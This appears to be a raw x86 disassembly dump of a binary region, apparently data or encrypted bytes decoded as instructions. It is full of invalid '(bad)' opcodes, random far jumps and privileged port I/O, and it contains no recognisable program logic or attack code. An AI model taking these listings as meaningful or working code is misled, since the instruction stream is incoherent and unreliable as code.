  4236c9:	sbb    DWORD PTR [eax+0x7c1b2610],esp
  4236cf:	(bad)  
  4236d0:	xchg   esi,eax
  4236d1:	cmp    ebx,ebp
  4236d3:	push   edx
  4236d4:	push   eax
  4236d5:	cmp    al,0xe
  4236d7:	mov    ebp,0x69f88dda
  4236dc:	add    DWORD PTR [esi],0x54f4688b
  4236e2:	add    al,0xc2
  4236e4:	push   esp
  4236e5:	aaa    
  4236e6:	mov    al,0x2a
  4236e8:	mov    ah,0x41
  4236ea:	pop    edx
  4236eb:	outs   dx,DWORD PTR ds:[esi]
  4236ec:	mov    bh,0x75
  4236ee:	rcl    BYTE PTR [eax-0x3cfaeeb0],0xc9
  4236f5:	fwait
  4236f6:	add    eax,0x1150f58a
  4236fb:	sbb    DWORD PTR [ecx-0x39],eax
  4236fe:	jle    0x42370b
  423700:	outs   dx,BYTE PTR ds:[esi]
  423701:	add    al,BYTE PTR [edi+0x35]
  423704:	ds xchg edi,eax
  423706:	iret   
  423707:	test   eax,0x746b285f
  42370c:	imul   BYTE PTR [ebx+0x45]
  42370f:	dec    esp
  423710:	ds jmp 0x4236c8
  423713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423714:	bound  ebp,QWORD PTR [ebx-0x29]
  423717:	fbld   TBYTE PTR [ecx]
  423719:	fidivr WORD PTR [esi]
  42371b:	jmp    0x2d5c:0x4e0827ae
  423722:	xlat   BYTE PTR ds:[ebx]
  423723:	repnz add ch,BYTE PTR [edi]
  423726:	dec    eax
  423727:	cmp    eax,0x98c2e773
  42372c:	adc    BYTE PTR ds:0x9ddd5f5d,ch
  423732:	sub    BYTE PTR [edx+0x45857110],dl
  423738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423739:	es aas 
  42373b:	dec    esi
  42373c:	out    0xa6,al
  42373e:	loope  0x4236f0
  423740:	in     eax,dx
  423741:	jmp    0x423741
  423743:	jp     0x42378e
  423745:	ror    BYTE PTR [edi+0x444ff0b],cl
  42374b:	sti    
  42374c:	lahf   
  42374d:	or     edi,0x8d47cbd7
  423753:	scas   eax,DWORD PTR es:[edi]
  423754:	clc    
  423755:	sbb    al,0x90
  423757:	mov    dl,BYTE PTR [esi+0x2]
  42375a:	xchg   esi,eax
  42375b:	bound  esi,QWORD PTR [edx]
  42375d:	pop    es
  42375e:	mov    eax,ds:0x44cb09d4
  423763:	lods   al,BYTE PTR ds:[esi]
  423764:	lock cwde 
  423766:	mov    ebx,edi
  423768:	test   al,0x2d
  42376a:	push   ss
  42376b:	cmp    DWORD PTR [ebx+0x2e],ebx
  42376e:	inc    esi
  42376f:	ror    edi,0x47
  423772:	int    0x3
  423774:	push   edx
  423775:	jbe    0x423724
  423777:	dec    esi
  423778:	pop    ebp
  423779:	es in  al,dx
  42377b:	dec    edx
  42377c:	adc    eax,0x96a99bf9
  423781:	or     BYTE PTR [ecx+0x3e],bh
  423784:	xchg   esi,eax
  423785:	pop    ds
  423786:	fdivr  QWORD PTR [ecx-0x280c14d2]
  42378c:	pop    edi
  42378d:	ins    DWORD PTR es:[edi],dx
  42378e:	add    DWORD PTR [ebx],0x0
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0x721dccd4
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	mov    bl,0xad
  42380e:	xor    al,0x1f
  423810:	js     0x4237cf
  423812:	loop   0x42380f
  423814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423815:	mov    eax,ds:0x40946df9
  42381a:	jb     0x423801
  42381c:	dec    ebp
  42381d:	jo     0x423854
  42381f:	fdivr  st,st(2)
  423821:	cmp    al,0xf9
  423823:	ret    
  423824:	mov    ebp,0x62f92178
  423829:	inc    ebx
  42382a:	out    dx,eax
  42382b:	shr    DWORD PTR [eax],1
  42382d:	and    BYTE PTR [ebx+0x78],ah
  423830:	ret    0x1916
  423833:	mov    esp,0x74a8a9e0
  423838:	pushf  
  423839:	mov    cl,0xf
  42383b:	jg     0x42387c
  42383d:	jl     0x4237f0
  42383f:	or     DWORD PTR [eax],esp
  423841:	push   ecx
  423842:	add    cl,BYTE PTR [esi+ecx*2]
  423845:	int    0x52
  423847:	test   eax,0x613fe065
  42384c:	sbb    al,0xc8
  42384e:	repnz push es
  423850:	adc    edi,DWORD PTR [ebx-0x51c724ec]
  423856:	mov    edx,0x4bf54704
  42385b:	ins    DWORD PTR es:[edi],dx
  42385c:	xchg   BYTE PTR [esi-0x6c],ch
  42385f:	enter  0xbdf8,0x48
  423863:	and    bh,BYTE PTR [ecx+0x6c]
  423866:	push   ecx
  423867:	sbb    eax,0x8dfdb3ea
  42386c:	sub    dl,BYTE PTR [edi-0x43]
  42386f:	push   eax
  423870:	dec    esi
  423871:	fisub  WORD PTR [ebx]
  423873:	push   0x5e
  423875:	pop    ebx
  423876:	test   BYTE PTR [ecx],ch
  423878:	xor    DWORD PTR [ebp+edi*2+0x40],edi
  42387c:	xchg   DWORD PTR [ebx-0x6a359991],esi
  423882:	jo     0x4238ad
  423884:	push   0x54116a9a
  423889:	mov    WORD PTR [ebp-0x3e],ds
  42388c:	or     ch,BYTE PTR [esp+ebp*2-0x1e0f39b7]
  423893:	push   0x40
  423895:	or     eax,0x9d7f1165
  42389a:	imul   ebx,ebx,0x12
  42389d:	sbb    bl,BYTE PTR [eax+ecx*8+0x1e6769d2]
  4238a4:	jmp    0x327724dd
  4238a9:	xchg   ebx,eax
  4238aa:	pop    ecx
  4238ab:	xchg   dl,dh
  4238ad:	dec    esp
  4238ae:	(bad)  
  4238b0:	sub    DWORD PTR [edx-0x1c],ecx
  4238b3:	push   edx
  4238b4:	xchg   dh,dl
  4238b6:	std    
  4238b7:	adc    al,0xf4
  4238b9:	and    DWORD PTR [edi-0x2f],edi
  4238bc:	imul   edi,ecx,0xcbb405d3
  4238c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238c3:	mov    bh,0xe9
  4238c5:	inc    esp
  4238c6:	lods   eax,DWORD PTR ds:[esi]
  4238c7:	xchg   edx,eax
  4238c8:	dec    edi
  4238c9:	out    0xed,eax
  4238cb:	add    eax,0x51a7d7e7
  4238d0:	dec    ebp
  4238d1:	jns    0x423901
  4238d3:	inc    esp
  4238d4:	sahf   
  4238d5:	push   esp
  4238d6:	lods   eax,DWORD PTR ds:[esi]
  4238d7:	push   cx
  4238d9:	test   DWORD PTR [edi+0x4362babb],ebp
  4238df:	ins    DWORD PTR es:[edi],dx
  4238e0:	add    eax,0xc40a2b03
  4238e5:	or     BYTE PTR [edx+edi*2],dl
  4238e8:	and    DWORD PTR [ebx+0x5fb6cb97],ebx
  4238ee:	mov    WORD PTR [ebx+0x1c9f53f8],ds
  4238f4:	cdq    
  4238f5:	repnz ins BYTE PTR es:[edi],dx
  4238f7:	mov    cs,edx
  4238f9:	fadd   st(3),st
  4238fb:	int3   
  4238fc:	arpl   WORD PTR [eax-0x2c],sp
  4238ff:	retf   
  423900:	mov    al,0x4f
  423902:	cs repnz add al,0xae
  423906:	mov    edx,esi
  423908:	pushf  
  423909:	stos   BYTE PTR es:[edi],al
  42390a:	out    dx,eax
  42390b:	out    dx,eax
  42390c:	cmp    ch,BYTE PTR [ecx+0x71ed]
	...
  423972:	add    BYTE PTR [eax],al
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x68f12bbd
  423982:	push   esp
  423983:	dec    esp
  423984:	js     0x423a01
  423986:	add    DWORD PTR [eax],eax
  423988:	add    al,0x1
  42398a:	add    BYTE PTR [eax],al
  42398c:	pop    ebp
  42398d:	ja     0x4239aa
  42398f:	retf   
  423990:	and    bl,ch
  423992:	xor    eax,0xbe4d5fb0
  423997:	mov    edi,?
  423999:	call   0x79047d24
  42399e:	add    al,0x5f
  4239a0:	push   0xffffffd8
  4239a2:	inc    edi
  4239a3:	push   ss
  4239a4:	adc    BYTE PTR [eax+0x3d140995],bl
  4239aa:	clc    
  4239ab:	mov    bl,0x27
  4239ad:	add    dl,BYTE PTR [eax]
  4239af:	cdq    
  4239b0:	mov    ebx,0x38214909
  4239b5:	pusha  
  4239b6:	je     0x4239c3
  4239b8:	mov    ds,WORD PTR [edi-0x22]
  4239bb:	jmp    0x92ca34f
  4239c0:	inc    ebx
  4239c1:	sbb    BYTE PTR [ebx-0x2d4c9726],ch
  4239c7:	test   eax,esi
  4239c9:	fimul  WORD PTR [edx]
  4239cb:	or     BYTE PTR [ebx],al
  4239cd:	call   0x41747b72
  4239d2:	jae    0x4239c1
  4239d4:	jp     0x4239f8
  4239d6:	adc    DWORD PTR [edi-0x6c0580c8],edx
  4239dc:	sbb    bl,0xe6
  4239df:	mov    ch,al
  4239e1:	add    ebp,DWORD PTR [eax-0x2a876aad]
  4239e7:	sbb    DWORD PTR ds:0xf7d61dd6,eax
  4239ed:	(bad)  
  4239ee:	aam    0x97
  4239f0:	lds    ebx,FWORD PTR [esi+0x67]
  4239f3:	call   0x41a6:0x658861c2
  4239fa:	cmp    eax,0xa00f6203
  4239ff:	add    al,0xee
  423a01:	lds    edx,FWORD PTR [esi+0x72ccc0a]
  423a07:	xchg   BYTE PTR [edx],dh
  423a09:	dec    edx
  423a0a:	pop    es
  423a0b:	loopne 0x423a3e
  423a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a0e:	shl    BYTE PTR [ebx],0xe5
  423a11:	popa   
  423a12:	je     0x4239d7
  423a14:	and    dl,BYTE PTR [edi-0x47]
  423a17:	(bad)  
  423a19:	aaa    
  423a1a:	popa   
  423a1b:	jmp    0x423a30
  423a1d:	jo     0x423a81
  423a1f:	dec    ebx
  423a20:	ret    0x4307
  423a23:	ret    
  423a24:	int    0xdd
  423a26:	mov    al,ds:0x73149080
  423a2b:	imul   DWORD PTR [eax+0x79]
  423a2e:	pop    ebp
  423a2f:	ds add esp,ecx
  423a32:	adc    dh,bh
  423a34:	or     al,BYTE PTR [ecx+0x74]
  423a37:	lods   al,BYTE PTR ds:[esi]
  423a38:	push   es
  423a39:	repnz mov eax,tr5
  423a3d:	sub    cl,bh
  423a3f:	or     eax,0xdcadfc59
  423a44:	push   ds
  423a45:	gs popf 
  423a47:	dec    ebx
  423a48:	and    eax,0x555554b4
  423a4d:	js     0x423a44
  423a4f:	aaa    
  423a50:	mov    eax,0x1bbc8af5
  423a55:	jb     0x423ab2
  423a57:	jl     0x4239f1
  423a59:	add    edi,DWORD PTR [ebx]
  423a5b:	retf   0x848d
  423a5e:	in     eax,dx
  423a5f:	(bad)  
  423a60:	rcl    edx,1
  423a62:	mov    dh,0x88
  423a64:	popa   
  423a65:	pop    edi
  423a66:	mov    edi,0x36ba0c13
  423a6b:	cmp    DWORD PTR [eax-0x30],eax
  423a6e:	jp     0x423ae2
  423a70:	(bad)  
  423a71:	sbb    al,0xce
  423a73:	je     0x423ad1
  423a75:	test   al,0x5
  423a77:	xor    eax,0x68890c6c
  423a7c:	imul   ebp
  423a7e:	je     0x423a2f
  423a80:	xlat   BYTE PTR ds:[ebx]
  423a81:	add    BYTE PTR [eax],ch
  423a83:	jp     0x423a52
  423a85:	pop    es
  423a86:	jecxz  0x423abf
  423a88:	cmp    dh,bh
  423a8a:	mov    cl,0x48
  423a8c:	mov    dl,0xde
  423a8e:	arpl   WORD PTR [ebx+0x0],bp
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	cwde   
  423b01:	out    0xb6,eax
  423b03:	mov    ah,0x7c
  423b05:	jl     0x423b08
  423b07:	add    BYTE PTR [ecx+eax*1],al
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	xor    dl,bh
  423b0e:	test   BYTE PTR [edx-0x10],al
  423b11:	lods   eax,DWORD PTR ds:[esi]
  423b12:	pop    ebx
  423b13:	jmp    0x24296c3a
  423b18:	outs   dx,DWORD PTR ds:[esi]
  423b19:	push   edi
  423b1a:	xchg   ebx,eax
  423b1b:	sti    
  423b1c:	jge    0x423b53
  423b1e:	inc    eax
  423b1f:	out    0xe,eax
  423b21:	leave  
  423b22:	sbb    bh,ah
  423b24:	fdiv   QWORD PTR [edx-0x19abd624]
  423b2a:	dec    edi
  423b2b:	cdq    
  423b2c:	retf   0xffff
  423b2f:	jecxz  0x423ae9
  423b31:	retf   
  423b32:	pusha  
  423b33:	scas   al,BYTE PTR es:[edi]
  423b34:	clc    
  423b35:	add    DWORD PTR [ebx],eax
  423b37:	out    0x4f,eax
  423b39:	xchg   esi,eax
  423b3a:	arpl   WORD PTR [edx+0x16],sp
  423b3d:	ins    BYTE PTR es:[edi],dx
  423b3e:	cdq    
  423b3f:	fadd   QWORD PTR [ecx+0x64]
  423b42:	ror    BYTE PTR [ebx],0x1d
  423b45:	mov    bh,0x18
  423b47:	bound  esp,QWORD PTR [esi+0x1e615115]
  423b4d:	sbb    esi,DWORD PTR [eax-0x17dbddda]
  423b53:	in     eax,0xc1
  423b55:	pop    esp
  423b56:	pusha  
  423b57:	dec    eax
  423b58:	(bad)  [edx-0x6f]
  423b5b:	or     ebp,ebp
  423b5d:	loope  0x423b04
  423b5f:	lahf   
  423b60:	push   ds
  423b61:	retf   
  423b62:	sti    
  423b63:	je     0x423bb4
  423b65:	push   0x47fd9c9
  423b6a:	scas   eax,DWORD PTR es:[edi]
  423b6b:	add    ah,BYTE PTR [edx]
  423b6d:	mov    esi,0x77ea2761
  423b72:	inc    eax
  423b73:	(bad)  
  423b74:	adc    ebx,DWORD PTR [edi+0x1e7bd75f]
  423b7a:	mov    gs,WORD PTR [esi]
  423b7c:	xchg   ebp,eax
  423b7d:	fwait
  423b7e:	jae    0x423b22
  423b80:	dec    esi
  423b81:	iret   
  423b82:	es sub al,0x33
  423b85:	sbb    esi,esi
  423b87:	gs scas eax,DWORD PTR es:[edi]
  423b89:	push   esp
  423b8a:	sar    ah,cl
  423b8c:	lods   eax,DWORD PTR ds:[esi]
  423b8d:	pop    ebp
  423b8e:	cmp    al,0x6d
  423b90:	dec    ebx
  423b91:	repz or eax,0x452f0941
  423b97:	in     eax,0x1c
  423b99:	dec    ecx
  423b9a:	jle    0x423bda
  423b9c:	data16 jo 0x423bf0
  423b9f:	jne    0x423bb8
  423ba1:	test   eax,0xaac32e1
  423ba6:	ret    0xdf79
  423ba9:	scas   al,BYTE PTR es:[edi]
  423baa:	hlt    
  423bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bac:	jmp    0xb44a4726
  423bb1:	les    edi,FWORD PTR [esi+edx*8-0x308aebbf]
  423bb8:	or     eax,0xb839168b
  423bbd:	imul   ebx,DWORD PTR [ecx],0x6f
  423bc0:	push   eax
  423bc1:	pop    edi
  423bc2:	cmp    eax,0x3aa45dc8
  423bc7:	imul   edx,ecx,0x3fa594f1
  423bcd:	mov    dl,BYTE PTR [ebp+0x533bbaf9]
  423bd3:	lock sbb al,0x7d
  423bd6:	xchg   edi,eax
  423bd7:	mov    ds:0xf5663431,eax
  423bdc:	adc    DWORD PTR [esi],edx
  423bde:	fsubrp st(1),st
  423be0:	imul   esi,ebp,0xffffffb9
  423be3:	inc    esp
  423be4:	std    
  423be5:	jae    0x423c46
  423be7:	cld    
  423be8:	icebp  
  423be9:	neg    BYTE PTR [eax+edx*1+0x157a9211]
  423bf0:	pusha  
  423bf1:	push   cs
  423bf2:	int    0x69
  423bf4:	clc    
  423bf5:	xlat   BYTE PTR ds:[ebx]
  423bf6:	cwde   
  423bf7:	mov    al,ds:0xcdba9c87
  423bfc:	xchg   ebp,eax
  423bfd:	mov    esi,0xb46800ec
  423c02:	and    eax,0x151f8f0c
  423c07:	cmp    eax,0x16a6f490
  423c0c:	dec    edi
  423c0d:	add    bh,0xe3
	...
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x46bb99e9]
  423c81:	push   ecx
  423c82:	cld    
  423c83:	pop    ebx
  423c84:	cmp    BYTE PTR [ebp+0x1],0x0
  423c88:	add    al,0x1
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	push   ds
  423c8d:	ss add eax,ebp
  423c90:	nop
  423c91:	es test eax,0x47066539
  423c97:	in     al,0xfe
  423c99:	cmp    al,0x2a
  423c9b:	gs in  al,0xdb
  423c9e:	in     eax,0x64
  423ca0:	lea    ebx,[edi-0x2698e00c]
  423ca6:	sbb    al,0x7e
  423ca9:	dec    edx
  423caa:	push   edi
  423cab:	sub    eax,0xb5fe91c6
  423cb0:	jl     0x423c6c
  423cb2:	or     bh,BYTE PTR [ecx+0x26d09d90]
  423cb8:	call   0x89fa2ba6
  423cbd:	lods   eax,DWORD PTR ds:[esi]
  423cbe:	cmp    bl,0xcf
  423cc1:	push   DWORD PTR [edi+0x292d6edc]
  423cc7:	inc    esi
  423cc8:	adc    ch,ch
  423cca:	jp     0x423d42
  423ccc:	push   esp
  423ccd:	jae    0x423d23
  423ccf:	gs cdq 
  423cd1:	nop
  423cd2:	sar    BYTE PTR [edi-0x76b981c8],1
  423cd8:	jnp    0x423cb4
  423cda:	test   DWORD PTR [eax-0x67],ebx
  423cdd:	and    ebp,DWORD PTR [ebx-0x15]
  423ce0:	test   eax,0x39e3dd09
  423ce5:	aas    
  423ce6:	idiv   BYTE PTR [ebp-0x5d]
  423ce9:	retf   0x687e
  423cec:	fmul   st,st(5)
  423cee:	mov    ds:0x231c7429,eax
  423cf3:	mov    al,0x5b
  423cf5:	in     eax,dx
  423cf6:	mov    edi,0x6814150f
  423cfb:	cdq    
  423cfc:	fwait
  423cfd:	leave  
  423cfe:	sub    BYTE PTR [ebp-0x7b8c2a8a],dl
  423d04:	call   0xffde:0x8f61b469
  423d0b:	add    BYTE PTR es:[ebx+0xb955eb3],dl
  423d12:	sbb    eax,0xe14fec1
  423d17:	(bad)  
  423d18:	jge    0x423d0c
  423d1a:	lock out dx,eax
  423d1c:	ins    DWORD PTR es:[edi],dx
  423d1d:	inc    edx
  423d1e:	loopne 0x423d7d
  423d20:	inc    edx
  423d21:	mov    esi,DWORD PTR [edi-0x7234333d]
  423d27:	dec    edi
  423d28:	dec    esi
  423d29:	aad    0x46
  423d2b:	cld    
  423d2c:	ins    BYTE PTR es:[edi],dx
  423d2d:	push   edx
  423d2e:	push   es
  423d2f:	mov    al,0xac
  423d31:	lds    ebp,FWORD PTR [ebx+0x7b5e687a]
  423d37:	sar    DWORD PTR [edi-0x3],cl
  423d3a:	in     eax,0xea
  423d3c:	mov    ah,0x6e
  423d3e:	xor    eax,0x2f6b4c07
  423d43:	dec    esi
  423d44:	xor    eax,0xb6eba693
  423d49:	nop
  423d4a:	jns    0x423d33
  423d4c:	leave  
  423d4d:	lds    ebx,FWORD PTR gs:[eax+ebp*1-0x4203fc43]
  423d55:	stc    
  423d56:	xor    al,0xae
  423d58:	sbb    dh,BYTE PTR [esi]
  423d5a:	test   bh,dl
  423d5c:	pop    ss
  423d5d:	sbb    DWORD PTR [eax-0x2fbffd2c],ebp
  423d63:	arpl   di,bp
  423d65:	imul   esp,DWORD PTR [edi],0x2f60804e
  423d6b:	xor    eax,0x73c45d88
  423d70:	inc    esi
  423d71:	jp     0x423d8c
  423d73:	push   ds
  423d74:	call   0x21f37236
  423d79:	arpl   bp,dx
  423d7b:	xchg   ecx,eax
  423d7c:	mov    esi,edi
  423d7e:	(bad)  
  423d7f:	or     BYTE PTR [esi+0x4a0328d8],cl
  423d85:	mov    cl,bl
  423d87:	jo     0x423d35
  423d89:	aam    0xcf
  423d8b:	sahf   
  423d8c:	lods   al,BYTE PTR ds:[esi]
  423d8d:	sub    esp,eax
  423d8f:	adc    eax,DWORD PTR [eax]
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax-0x3d536f2e],esp
  423e03:	mov    BYTE PTR [esi+edi*2+0x1040001],al
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	and    ecx,esp
  423e0e:	addr16 (bad) 
  423e11:	and    DWORD PTR [edi+0x60776e7],ebp
  423e17:	dec    ebp
  423e18:	ds xor al,0x42
  423e1b:	push   esp
  423e1c:	lods   eax,DWORD PTR ds:[esi]
  423e1d:	scas   eax,DWORD PTR es:[edi]
  423e1e:	or     BYTE PTR [ebp+0x4ff6c760],bl
  423e24:	int3   
  423e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e26:	jmp    0xf4ca8eb6
  423e2b:	jmp    0xbfd3:0x922c3761
  423e32:	call   DWORD PTR [ebp+eiz*1-0x16de7db8]
  423e39:	jae    0x423e48
  423e3b:	jecxz  0x423e3b
  423e3d:	pop    edx
  423e3e:	sub    al,0x3d
  423e40:	stc    
  423e41:	pop    edi
  423e43:	cmp    eax,0x9112059
  423e48:	push   0x6fc5a801
  423e4d:	sbb    ch,ah
  423e4f:	push   eax
  423e50:	rcr    BYTE PTR ds:0xc0431079,0x7
  423e57:	iret   
  423e58:	(bad)  
  423e59:	ds pushf 
  423e5b:	push   es
  423e5c:	mov    ds,edx
  423e5e:	sbb    al,0x2d
  423e60:	pop    esi
  423e61:	call   0x257640b1
  423e66:	vpsubw xmm7,xmm1,XMMWORD PTR [edi+0x66]
  423e6b:	cld    
  423e6c:	pop    ebp
  423e6d:	xchg   edi,eax
  423e6e:	stos   BYTE PTR es:[edi],al
  423e6f:	(bad)  
  423e72:	fdivr  DWORD PTR [ebp-0x73]
  423e75:	mov    dh,BYTE PTR [esi]
  423e77:	sub    eax,0x2d1727de
  423e7c:	mov    eax,0x6d98981
  423e81:	and    bl,bl
  423e83:	dec    esi
  423e84:	fimul  WORD PTR [esi]
  423e86:	addr16 or esi,ebp
  423e89:	push   esp
  423e8a:	jns    0x423e2e
  423e8c:	and    DWORD PTR [edi],edi
  423e8e:	fs in  al,0xcb
  423e91:	add    dl,cl
  423e93:	mov    ebp,0xe0e29a69
  423e98:	jl     0x423e93
  423e9a:	bound  edx,QWORD PTR [ebx]
  423e9c:	sbb    eax,0xa457b950
  423ea1:	in     al,0xa1
  423ea3:	frstor [esi-0x12]
  423ea6:	push   ecx
  423ea7:	cmp    DWORD PTR [edi+0x6a],ecx
  423eaa:	xchg   DWORD PTR [esi-0x1e],eax
  423ead:	aad    0xf7
  423eaf:	fcmovnu st,st(7)
  423eb1:	mov    esp,ebp
  423eb3:	sub    BYTE PTR [edx],al
  423eb5:	call   0x1d17:0x79667d3
  423ebc:	xchg   ebx,eax
  423ebd:	sub    BYTE PTR [edx-0x5b5b254a],ah
  423ec3:	mov    fs,WORD PTR [ebx-0x6c5c7cc2]
  423ec9:	mov    ecx,0xeab472c6
  423ece:	add    al,0xed
  423ed0:	inc    ebx
  423ed1:	std    
  423ed2:	mov    fs,WORD PTR [eax+esi*1+0x35]
  423ed6:	mov    dl,0xc4
  423ed8:	and    BYTE PTR [ebx-0x208f9728],ah
  423ede:	add    al,0x52
  423ee0:	pop    esi
  423ee1:	xchg   edi,eax
  423ee2:	stc    
  423ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ee4:	js     0x423e91
  423ee6:	pusha  
  423ee7:	outs   dx,BYTE PTR ds:[esi]
  423ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ee9:	rcr    BYTE PTR [ecx-0x4],1
  423eec:	scas   al,BYTE PTR es:[edi]
  423eed:	je     0x423f51
  423eef:	or     dh,dh
  423ef1:	shr    DWORD PTR [ebx-0x55],1
  423ef4:	xor    esi,DWORD PTR [ebx]
  423ef6:	rol    DWORD PTR cs:[ecx],0xc6
  423efa:	cli    
  423efb:	cs das 
  423efd:	sti    
  423efe:	sar    BYTE PTR [ebp+0x3f],0xdc
  423f02:	mul    DWORD PTR [esi-0x306db033]
  423f08:	(bad)  
  423f0a:	sub    BYTE PTR [eax-0x34],dh
  423f0d:	bound  ecx,QWORD PTR [edi+ebp*8+0x0]
	...
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	add    BYTE PTR [ebx+0x7f884eb4],0x1
  423f87:	add    BYTE PTR [ecx+eax*1],al
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	push   eax
  423f8d:	daa    
  423f8e:	jae    0x423fc3
  423f90:	cdq    
  423f91:	fsubr  QWORD PTR [edx]
  423f93:	push   ss
  423f94:	jno    0x423f57
  423f96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f97:	cmp    eax,0xe964a47c
  423f9c:	rol    BYTE PTR [edi],0x6b
  423f9f:	add    esi,eax
  423fa1:	in     eax,dx
  423fa2:	nop
  423fa3:	or     BYTE PTR [esp+eax*1],0x23
  423fa7:	hlt    
  423fa8:	gs push ss
  423faa:	cmp    ebx,DWORD PTR [ebp-0x3e507a9d]
  423fb0:	loopne 0x424018
  423fb2:	fnstsw WORD PTR [edx+0x6d3b568]
  423fb8:	mov    eax,ds:0x8d808778
  423fbd:	sbb    bh,BYTE PTR [eax]
  423fbf:	jmp    0xa4a3:0x762f0afc
  423fc6:	ss hlt 
  423fc8:	inc    ebx
  423fc9:	push   0xde436825
  423fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fcf:	or     DWORD PTR [ebx],eax
  423fd1:	sub    eax,0x2b294b57
  423fd6:	add    eax,0xcecad71e
  423fdb:	scas   eax,DWORD PTR es:[edi]
  423fdc:	out    0x51,eax
  423fde:	leave  
  423fdf:	shl    BYTE PTR [esi+0x34f7018],cl
  423fe5:	jmp    0x423fcd
  423fe7:	xchg   edi,eax
  423fe8:	loopne 0x423f6a
  423fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423feb:	push   ds
  423fec:	cmc    
  423fed:	lea    esp,[edi+0x43]
  423ff0:	in     eax,dx
  423ff1:	sub    BYTE PTR [edi],0x68
  423ff4:	(bad)  
  423ff6:	jbe    0x42400c
  423ff8:	sar    ch,0x4a
  423ffb:	mov    ebp,0xa6d58be7
  424000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424001:	push   ecx
  424002:	and    dh,ch
  424004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424005:	mov    dl,0xd1
  424007:	pop    esp
  424008:	sbb    DWORD PTR [esi],edi
  42400a:	dec    ebp
  42400b:	scas   eax,DWORD PTR es:[edi]
  42400c:	ins    BYTE PTR es:[edi],dx
  42400d:	adc    eax,0xb7bb2fae
  424012:	mov    ch,0x9e
  424014:	pop    esp
  424015:	test   DWORD PTR [edx],0xb0039062
  42401b:	add    eax,0x50788c0
  424020:	jmp    0x469dbd08
  424025:	cdq    
  424026:	jmp    0x20aa:0x9e70b278
  42402d:	out    0x75,eax
  42402f:	aam    0x4
  424031:	addr16 jmp 0x1b85a67c
  424037:	xchg   sp,ax
  424039:	pop    es
  42403a:	test   BYTE PTR [esi-0xe0e08d2],al
  424040:	lock push ss
  424042:	push   ecx
  424043:	out    dx,al
  424044:	or     esp,ebx
  424046:	and    ah,BYTE PTR [edi+edx*2+0x178eb701]
  42404d:	jo     0x424074
  42404f:	test   eax,0xff9d5a70
  424054:	lahf   
  424055:	push   es
  424056:	cmp    al,0x88
  424058:	sub    DWORD PTR [edx+0x75164cb7],ebp
  42405e:	popf   
  42405f:	and    bl,BYTE PTR [edi+0x32]
  424062:	test   DWORD PTR [esi+0x32311f71],0xf71e8d0f
  42406c:	mov    esi,0xf938b820
  424071:	pusha  
  424072:	mov    WORD PTR [edi+0x3e16ac2f],es
  424078:	pop    eax
  424079:	in     al,dx
  42407a:	fmul   QWORD PTR [ecx-0xd74f500]
  424080:	test   al,0x1d
  424082:	or     DWORD PTR [esi+0x39e7409c],eax
  424088:	mov    dl,0x20
  42408a:	inc    esp
  42408b:	test   BYTE PTR [esi],cl
  42408d:	xchg   esp,eax
  42408e:	ret    
  42408f:	xor    eax,DWORD PTR [eax]
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	jnp    0x424091
  424102:	call   0x1c2cd4b
  424107:	add    BYTE PTR [ecx+eax*1],al
  42410a:	add    BYTE PTR [eax],al
  42410c:	mov    cl,0xbe
  42410e:	sbb    BYTE PTR [ebx-0x56218c50],al
  424114:	outs   dx,BYTE PTR ds:[esi]
  424115:	mov    ch,0x60
  424117:	dec    edx
  424118:	fiadd  WORD PTR [esi-0x57c3c11b]
  42411e:	(bad)  [edx+0x64]
  424121:	inc    ecx
  424122:	fnstcw WORD PTR [eax+0x70]
  424125:	adc    ecx,DWORD PTR [esi+edx*1+0x56]
  424129:	xchg   edi,eax
  42412a:	retf   0x8e60
  42412d:	icebp  
  42412e:	and    BYTE PTR [ebx+0x60],bh
  424131:	pushf  
  424132:	xor    eax,0xff949611
  424137:	int3   
